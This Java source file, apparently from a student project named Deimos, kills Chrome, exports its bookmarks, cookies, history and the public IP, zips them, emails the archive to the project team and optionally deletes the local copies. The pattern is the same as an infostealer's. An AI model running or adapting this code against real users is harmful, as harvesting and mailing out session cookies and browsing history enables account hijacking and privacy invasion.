package deimos.phase1;

import java.io.File;
import java.io.IOException;
import java.net.UnknownHostException;
import java.text.SimpleDateFormat;
import java.util.Date;

import org.sqlite.SQLiteException;

import deimos.common.DeimosConfig;
import deimos.common.Mailer;
import deimos.common.ProcessFileUtils;

/**
 * Combines all export functions,
 * Zips the output files to a single ZIP file.
 * 
 * Reference: www.mkyong.com/java/how-to-compress-files-in-zip-format/
 * 
 * @author Siddhesh Karekar
 * @author Bhushan Pathak
 * @author Amogh Bhabal
 */

public class ExportAll {
	
	public static final String PROCESS_CHROME_WIN = "chrome.exe";
	
	public static boolean isChromeRunning() {
		try {
			return ProcessFileUtils.isProcessRunning(ExportAll.PROCESS_CHROME_WIN);
		} catch (IOException e) {
			return false;
		}
	}
	
	public static boolean killChrome() {
		System.out.print("Ensuring Chrome is not running: ");
		
		boolean killed = false;
		
		try
		{
			if(ProcessFileUtils.isProcessRunning(PROCESS_CHROME_WIN))
			{
				ProcessFileUtils.killProcess(PROCESS_CHROME_WIN);
				killed = true;
			}
			else {
				killed = true;
			}
		} catch (IOException e) {
			
			e.printStackTrace();
		}
		System.out.println(killed);
		return killed;
	}
	
	/**
	 * Deletes all the files defined in DeimosConfig
	 * @return true if success, false if was unable to delete all the files.
	 */
	public static boolean deleteOutputFiles() {
		
		boolean success = true;
		
		int count_files = 0;
		
		for(String filename : DeimosConfig.FILES_OUTPUT_ALL) {
			
			File file = new File(filename);
			
			boolean result = file.delete();
			if(result) count_files++;
			success = success & result;
		}
		
		System.out.println(count_files+ " file(s) deleted.");
		
		return success;
	}
	
	
	public static void mailOutputToDeimosTeam() {

		String date = new SimpleDateFormat("dd/MM/yy HH:mm:ss").format(new Date());


		Mailer.mailToDeimosTeam("Training Data: "+date,
				"Sample body in ExportAll",
				DeimosConfig.FILE_OUTPUT_ALL_ZIP);
		
	}

	public static void main(String[] args) {
		
		killChrome();
		
		ExportBookmarks.retreiveBookmarksAsFile(DeimosConfig.FILE_OUTPUT_BOOKMARKS);
		
		try {
			ExportCookies.retreiveCookiesAsFile(DeimosConfig.FILE_OUTPUT_COOKIES);
		} catch (SQLiteException e) {
			
			e.printStackTrace();
		}
		
		try {
			ExportHistory.retreiveHistoryAsFile(DeimosConfig.FILE_OUTPUT_HISTORY);
		}
		catch (SQLiteException sle) {
			
			sle.printStackTrace();
		}
		
		try {
			ExportIP.retrievePublicIPAsFile(DeimosConfig.FILE_OUTPUT_PUBLICIP);
		} catch (UnknownHostException e) {

			e.printStackTrace();
		}
		
		ExportUserInfo.retrieveUserInfoAsFile("John", "Doe",
				"male", 1995, null, DeimosConfig.FILE_OUTPUT_USERINFO);
		
		Zipper.zipOutputFiles(DeimosConfig.FILE_OUTPUT_ALL_ZIP);
		
		mailOutputToDeimosTeam();

       	System.out.println("Finished!");
		
       	if(DeimosConfig.OPTION_DELETE_P1_OUTPUT)
       		deleteOutputFiles();
	}

}
